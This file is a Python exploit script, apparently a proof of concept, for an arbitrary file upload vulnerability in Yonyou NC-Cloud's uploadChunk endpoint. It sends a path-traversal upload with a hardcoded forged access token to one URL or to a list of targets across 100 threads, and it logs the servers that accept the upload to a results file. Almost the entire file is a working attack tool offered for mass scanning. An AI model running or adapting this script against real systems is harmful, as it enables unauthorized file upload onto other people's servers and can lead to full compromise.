# 用友 NC-Cloud uploadChunk 任意文件上传漏洞

import requests,argparse,sys
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()
RED = '\033[91m' #输出颜色
RESET = '\033[0m'


def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:用友 NC-Cloud uploadChunk 任意文件上传漏洞
                                        version:1.0 author:YeahSir               
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='用友 NC-Cloud uploadChunk 任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
    url = target+payload
    headers = {
        "User-Agent": "ozilla/5.0(Macintosh;IntelMac OS X 10_15_6)AppleWebKit/605.1.15(KHTML, like Gecko)Version/15.6Safari/605.1.15", 
        "Connection": "close", 
        "Content-Type": "multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9", 
        "accessTokenNcc": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ", 
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = "\r\n--024ff46f71634a1c9bf8ec5820c26fa9\r\nContent-Disposition: form-data; name=\"file\"; filename=\".test.txt.\"\r\n\r\ntest\r\n--024ff46f71634a1c9bf8ec5820c26fa9--"
    try:
        re = requests.get(url=target,headers=headers,verify=False,timeout=5)
        res = requests.post(url,headers=headers,data=data,verify=False)
        if re.status_code == 200 :
            if res.status_code == 200 and '操作成功' in res.text:
                print( f"{RED}[+] {target} moffice接口处存在任意文件上传漏洞！{RESET}")
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
        else:
            print(f'该{target}moffice接口处不存在任意文件上传漏洞')
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()